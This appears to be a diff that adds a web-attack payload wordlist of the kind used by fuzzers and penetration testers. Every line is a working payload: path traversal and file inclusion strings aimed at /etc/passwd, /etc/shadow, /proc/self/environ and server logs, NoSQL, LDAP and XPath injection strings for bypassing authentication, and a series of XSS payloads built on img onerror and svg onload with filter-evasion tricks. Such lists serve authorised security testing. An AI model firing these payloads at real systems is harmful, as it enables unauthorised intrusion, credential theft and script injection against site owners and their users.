@@ -1,0 +1,65 @@
+/etc/passwd
+..///////..////..//////etc/passwd
+%252e%252e%252fetc%252fpasswd
+pHp://FilTer/convert.base64-encode/resource=
+/proc/self/environ
+/proc/version
+/proc/cmdline
+/proc/sched_debug
+/proc/mounts
+/proc/net/arp
+/proc/net/route
+/proc/net/tcp
+/proc/net/udp
+/var/log/apache/access.log
+/var/log/apache/error.log
+/var/log/httpd/error_log
+/usr/local/apache/log/error_log
+/usr/local/apache2/log/error_log
+/var/log/vsftpd.log
+/var/log/sshd.log
+/var/log/mail
+/etc/issue
+/etc/passwd
+/etc/shadow
+/etc/group
+/etc/hosts
+/etc/motd
+/etc/mysql/my.cnf
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+', $where: '1 == 1'
+1, $where: '1 == 1'
+{ $ne: 1 }
+', $or: [ {}, { 'a':'a
+' } ], $comment:'successful MongoDB injection'
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+|| 1==1
+' && this.password.match(/.*/)//+%00
+' && this.passwordzz.match(/.*/)//+%00
+'%20%26%26%20this.password.match(/.*/)//+%00
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00
+{$gt: ''}
+[$ne]=1
+username[$ne]=toto&password[$ne]=toto
+admin*)((|userpassword=*)
+admin*)((|userPassword=*)
+x' or name()='username' or 'x'='y
+*(|(mail=*))
+*(|(objectclass=*))
+*)(uid=*))(|(uid=*
+<img src=x onerror=alert('XSS');>
+<img src=x onerror=confirm('XSS')//
+<img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
+<img src=x:prompt(alt) onerror=eval(src) alt=xss>
+"><img src=x onerror=prompt('XSS');>
+"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<svg/onload=alert('XSS')>
+<svg onload=alert(1)//
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<svg id=alert(1) onload=eval(id)>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+"><svg/onload=alert(/XSS/)
